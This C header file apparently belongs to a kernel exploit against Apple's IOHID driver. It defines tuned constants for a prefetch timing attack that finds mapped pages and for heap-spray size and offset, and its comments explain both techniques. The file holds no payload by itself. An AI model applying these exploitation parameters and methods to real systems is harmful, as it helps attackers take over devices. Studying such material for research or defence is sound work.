#ifndef CONFIG_H
#define CONFIG_H

// This file contains all values that were not found deterministically
// by some formula or logic, but through experimenting.
// They have proven to yield good results on my setup,
// but might require tweaking in order to work on others.

// This is the threshold for the prefetch timing attack.
// I'm doing N timings per address, sort the array of timings, take the average
// of the middle N/4 values (i.e. 3/8th to 5/8th) and use that as my indicator.
// For unmapped pages, I have seen that value anywhere from 58 to 600, but for
// mapped pages it has been strictly within 28-32.
// Therefore I have chosen 50 as the value for which I will treat a page as
// unmapped if its indicator value is above it.
#define PREFETCH_LIMIT 50

// This setting affects heap spraying.
// Our bug allows us to offset evg by +- 2GB, however since we know neither
// the address of where we are nor the address of anything on the heap,
// we don't actually know what we're doing. Our best bet is to spray the heap
// with allocations that go to the same place as our IOHID shared memory and
// then try to land the structure within these allocations. Since allocations
// larger than two pages are allocated linearly, that is pretty easy though.
// We have the biggest chance to succeed with 2GB worth of allocations and
// an offset of almost that - if the heap is empty, we'll get to the end of
// our 2GB, and the fuller it is the further to the beginning of our 2GB we get.
// However, making a full >2GB of allocs takes FOREVER, i.e. the first 20% take
// a few seconds while the remaining 80% take half an hour or so.
// Half of that is a good compromise between speed (1 min of spraying) and safety.
// But if you wanna play it safe, then PLAY_IT_SAFE. ;)
#if 0
TODO: re-comment
#ifdef PLAY_IT_SAFE /* not defined by default */
#   define SPRAY_AMOUNT     0x90000000
#   define OFFSET_AMOUNT    0x7f000000
#else
#   define SPRAY_AMOUNT     0x40000000
#   define OFFSET_AMOUNT    0x30000000
#endif
#else
#   define SPRAY_AMOUNT     0x20000000
#   define OFFSET_AMOUNT    (int32_t)-0x2ce00000
#endif

#endif
